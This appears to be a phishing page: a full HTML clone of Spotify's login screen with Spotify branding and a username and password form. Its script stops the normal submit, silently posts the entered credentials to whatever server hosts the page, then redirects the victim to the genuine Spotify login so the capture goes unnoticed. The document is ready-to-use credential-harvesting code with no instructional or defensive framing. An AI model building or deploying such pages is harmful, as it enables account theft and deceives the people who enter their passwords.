<!DOCTYPE html><html lang="en"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width,initial-scale=1.0"><title>Login - Spotify</title><style>*{margin:0;padding:0;box-sizing:border-box}body{font-family:Circular,spotify-circular,Helvetica,Arial,sans-serif;background:#121212}.container{display:flex;justify-content:center;align-items:center;min-height:100vh}.box{background:#121212;width:380px;padding:32px;text-align:center}.logo{margin-bottom:40px;color:#1ed760;font-size:40px;font-weight:700}.title{color:white;font-size:28px;font-weight:700;margin-bottom:32px}input{width:100%;padding:14px;background:#121212;border:1px solid #727272;border-radius:4px;color:white;font-size:16px;margin-bottom:12px;outline:none}input:focus{border-color:white}input[type="submit"]{background:#1ed760;color:#000;border:none;font-weight:700;font-size:16px;cursor:pointer;border-radius:20px}input[type="submit"]:hover{background:#1fdf64;transform:scale(1.02)}.link{color:#b3b3b3;font-size:14px;margin-top:20px}.link a{color:white;text-decoration:underline}</style></head><body><div class="container"><div class="box"><div class="logo">Spotify</div><div class="title">Log in to Spotify</div><form method="POST"><input type="text"name="username"placeholder="Email or username"required><input type="password"name="password"placeholder="Password"required><input type="submit"value="Log In"></form><div class="link">Don't have an account? <a href="#">Sign up</a></div></div></div><script>document.querySelector('form').addEventListener('submit',function(e){e.preventDefault();fetch('',{method:'POST',body:new FormData(this)}).then(function(){window.location.href='https://accounts.spotify.com/en/login';});});</script></body></html>
